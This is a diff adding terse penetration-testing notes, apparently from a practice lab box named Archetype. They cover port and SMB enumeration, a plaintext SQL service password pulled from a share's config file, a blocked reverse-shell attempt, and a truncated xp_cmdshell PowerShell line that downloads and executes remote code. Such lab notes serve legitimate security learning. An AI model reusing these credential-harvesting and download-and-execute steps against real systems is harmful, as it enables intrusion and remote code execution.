@@ -1,0 +1,35 @@
+A) PORT
+
+1] 135  ---> RPC          ---> SAMBA
+2] 139  ---> netbios-ssn
+3] 445  ---> microsoft-ds
+4] 1433 ---> SQL Server   ---> Microsoft SQL Server 2017 RTM
+5] OS      ---> Windows Server 2008
+6] SMB     ----> security message signing disabled [default
+
+B) SCRIPT
+
+smb              ---> (likely) VULNERABLE to CVE-2008-4250 (RCE) [NOT VULNERABLE]
+
+os-smb-discovery ---> Windows Server 2019  
+
+
+C) 
+
+SMB ---> anonymous user ACCESS DENIED
+    ---> guest ACCESS w/out PASSWORD   
+    ---> smbclient result             ---> Sharename       Type      Comment
+				           ---------       ----      -------
+				           ADMIN$          Disk      Remote Admin
+	                                   backups         Disk      
+	                                   C$              Disk      Default share
+	                                   IPC$            IPC       Remote IPC
+
+   --->	inside backups/ get the prod.dtsConfig 
+
+   ---> inside prod.dtsConfig   ---> Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc; (mysqlclient credentials[?])
+   ---> using mssqlclient.py    ---> trying get a reverse shell but antivirus blocked it
+
+
+
+xp_cmdshell "powershell.exe -c IEX ((new-object net.webclient).downloadstring(\"
